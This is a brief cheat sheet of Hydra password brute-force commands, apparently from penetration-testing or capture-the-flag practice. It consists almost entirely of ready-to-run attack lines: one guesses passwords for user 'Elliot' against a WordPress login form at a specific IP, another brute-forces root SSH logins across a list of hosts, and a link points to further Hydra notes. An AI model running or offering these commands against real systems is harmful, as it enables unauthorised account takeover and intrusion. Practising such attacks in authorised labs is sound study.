# http-post-form
hydra 10.10.94.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect." -l 'Elliot' -P list.txt -t 10 -w 30
# ssh
hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
# others
https://github.com/gnebbia/hydra_notes
